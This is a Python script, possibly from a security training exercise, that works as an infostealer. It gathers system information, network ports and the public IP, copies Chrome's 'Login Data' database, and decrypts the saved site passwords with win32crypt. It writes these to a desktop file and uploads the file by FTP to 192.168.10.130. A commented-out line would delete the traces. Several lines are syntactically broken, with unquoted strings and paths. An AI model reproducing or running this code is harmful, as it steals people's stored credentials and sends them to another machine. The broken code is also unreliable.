import os
import sqlite3
import win32crypt
import sys
import requests
from bs4 import BeautifulSoup

def get_systeminfo():
	test=os.getenv('USERPROFILE')+\\Desktop
	sysinf_file = open(test+'\\result_file', 'a')
	print('\n\n\n==================================== 시스템 정보', file = sysinf_file)
	sysinf_file.close()
	os.system('systeminfo >>'+test+'\\result_file')
	get_ip()

def get_ip():
	req=requests.get('http://www.findmyip.org/')
	html=req.text
	soup=BeautifulSoup(html, 'html.parser')

	my_titles=soup.select(
		'tr > td')
	a=3
	b=7
	c=11
	d=17

	for title in my_titles:
		path3 = os.getenv(USERPROFILE)+\\Desktop
		ip_file = open(path3+'\\result_file', 'a', encoding='utf-8')
		print('''\n\n\n==================================== IP 주소
공인 IP address\t:%s
HOST IP address\t:%s
HOST Location\t:%s
Current Time\t:%s
			'''%(my_titles[3].text.replace('\n',''), my_titles[7].text.replace('\n',''), my_titles[11].text.replace('\n',''), my_titles[17].text.replace('\n','')), file = ip_file)
		ip_file.close()
		break
	get_port()

def get_port():
	test=os.getenv('USERPROFILE')+\\Desktop
	port_file = open(test+'\\result_file', 'a')
	print('\n\n\n==================================== 포트 정보', file = port_file)
	port_file.close()
	os.system('netstat -ano >>'+test+'\\result_file')
	get_chrome_passwd()

def get_chrome_passwd():
	try:
		path = sys.argv[1]
		
	except IndexError:
		for w in os.walk(os.getenv('USERPROFILE')):
			path2 = os.getenv(USERPROFILE)+\\Desktop\\Login_Data
			if 'Chrome' in w[0]:
				print(w[0],w[1],w[2])
				# if 'User Data' in w[0]:
				# 	if 'Default' in w[0]:
				if 'Login Data' in w[2]:
					path = str(w[0]) + '\\Login Data'
					print(copy \+path+\ \+path2+\)
					os.system(copy \+path+\ \+path2+\)
					break

	try:
		print ('[+] Opening ' + path2)
		conn = sqlite3.connect(path2)
		cursor = conn.cursor()
	except Exception as e:
		print ('[-] %s' % (e))
		sys.exit(1)

	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	except Exception as e:
		print ('[-] %s' % (e))
		sys.exit(1)

	data = cursor.fetchall()

	if len(data) > 0:
		path3 = os.getenv(USERPROFILE)+\\Desktop
		pwd_file = open(path3+'\\result_file', 'a')
		for result in data:
		# Decrypt the Password
			try:
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except Exception as e:
				print ('[-] %s' % (e))
				pass
			if password:
				print ('''
				\n\n\n==================================== 계정 아이디 비밀번호
	[+] URL: %s
	    Username: %s 
	    Password: %s''' %(result[0], result[1], password), file = pwd_file)
		
		pwd_file.close()

	else:
		print ('[-] No results returned from query')
		sys.exit(0)
	ftp_file_transport()
	
def ftp_file_transport():
	test=os.getenv('USERPROFILE')+\\Desktop
	ftp_file = open(test+'\\ftp_file.txt', 'a')
	print('kitri\nkitri\nput result_file\nbye', file=ftp_file)
	ftp_file.close()
	os.system('cd '+test)
	os.system('ftp -s:ftp_file.txt -i 192.168.10.130')
	# os.system('del result_file, ftp_file.txt, autofire.exe')

get_systeminfo()
